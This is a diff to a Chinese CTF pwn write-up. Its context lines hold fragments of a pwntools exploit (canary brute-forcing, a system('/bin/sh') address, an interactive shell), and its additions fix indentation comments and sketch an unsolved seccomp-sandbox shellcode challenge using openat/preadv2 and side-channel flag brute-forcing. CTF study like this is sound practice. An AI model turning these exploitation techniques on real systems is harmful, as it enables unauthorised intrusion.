@@ -38,9 +38,9 @@ for i in range(7):
         payload = b'a' * (0x50 + 8)+ canary + b.to_bytes(1, 'little')
         print("-------------------------------------\n", payload)
         p.recvuntil(b'\n')
+        # 这里复制过来的缩进在markdowm里看着有问题，下面两个recvuntil和print是同级的
         p.recvuntil(b'\xe6\x83\xb3\xe5\xbf\x85\xe6\x88\x91\xe7\x9a\x84\xe7\xa8\x8b\xe5\xba\x8f\xe4\xb8\x80\xe5\xae\x9a\xe5\xbe\x88\xe5\xae\x89\xe5\x85\xa8\xe5\x90\xa7\xce\xb5=\xce\xb5=\xce\xb5=(~\xef\xbf\xa3\xe2\x96\xbd\xef\xbf\xa3)~\n')
         p.recvuntil(b'\xe4\xbd\xa0\xe8\xa7\x89\xe5\xbe\x97\xe5\x91\xa2\xef\xbc\x9f\n')
-        
         p.send(payload)
         time.sleep(0.1)
         a = p.recv()
@@ -102,6 +102,7 @@ system_binsh = 0x401261 # 4199009
   
 
 for i in range(10):
+	# 这里复制过来的在markdown里看着有问题，下面这个recvuntil应该是在for里面和payload同级
 	      p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
 
     payload = '-'
@@ -116,6 +117,7 @@ payload = '0'
 p.sendline(payload)
 
 for i in range(4):
+	# 这里显示也是有问题，下面这个recvuntil在for里面
     p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
     payload = '1'
     p.sendline(payload)
@@ -123,3 +125,13 @@ for i in range(4):
 p.interactive()
 ```
 ![[Pasted image 20241013115334.png]]
+## Easy_Shellcode
+虽然这题没做出来，但感觉我的思路应该没错，应该是构造shellcode的水平实在不行。
+![[Pasted image 20241013115859.png]]
+可以看到仅打开了NX保护
+![[Pasted image 20241013115938.png]]
+进入主函数可以看到有sandbox，利用seccomp-tools工具查看![[Pasted image 20241013120103.png]]
+可以看到这个sandbox限制了除调用编号为257和327以外的其他所有调用函数的使用，这俩调用编号对应的函数是openat和preadv2。然后我们发现我们拥有0xd000000段的所有权限并且构造的shellcode会被放入0xd000721处并被执行，由于execve等被禁止调用，所以这里我们采用orw的方法来获取shell。
+orw指的是open,read和write，有由于sandbox限制了一些系统调用，但一般都会有这三个或这三个中的几个，所以我们可以使用open函数直接打开flag文件，用read函数将其读入到栈上或内存空间中，然后使用write函数再打印出来，从而获取flag
+但这道题中很显然我们只有or没有w，那么我们就只能用爆破的方法一位一位爆破flag的值，也就是侧信道爆破的方法，将flag的值爆破出来。
+在实际操作的过程中遇到的问题是我构造的shellcode并不能将我自己构造的flag读入到指定的位置上，并未能解决
